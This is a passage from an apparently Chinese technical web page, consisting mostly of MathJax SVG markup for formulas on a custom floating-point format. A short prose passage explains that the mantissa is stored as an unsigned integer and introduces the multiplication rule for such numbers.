250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4878.7,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(5878.9,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mo" transform="translate(7069.2,0)"><path data-c="2223" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(7625,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(8780.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(9836.5,0)"><g data-mml-node="mi" transform="translate(579.1,676)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="msup" transform="translate(220,-719.9)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,289) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><rect width="1490.1" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(11566.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(12011.3,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(12861.1,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mo" transform="translate(13805.8,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(14083.8,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(14583.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msup" transform="translate(15028.5,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(16318.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(16707.6,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container></span>
这里的<strong>m</strong>在存的时候是一个无符号整型，公式中将m的范围看作[0,1)只是一个逻辑映射，在数学上这个<strong>m</strong>就代表小数点后的内容。</p>
<p>然后我们看这个自定义的浮点数的乘法运算符合的规律： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="147.493ex" height="2.433ex" role="img" focusable="false" viewBox="0 -825.2 65191.7 1075.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(710.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1766.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2517.8,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(3240,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mspace" transform="translate(3669,0)"></g><g data-mml-node="mo" transform="translate(3946.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(5002.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(5391.6,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(6539.8,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(7262.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(7651.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(8373.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(9373.5,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(10708.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11319.8,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="msup" transform="translate(12042,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(13277.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(13888.9,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(14611.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(15000.2,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mo" transform="translate(16077.7,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(16799.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(17188.9,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(17911.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(18911.4,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 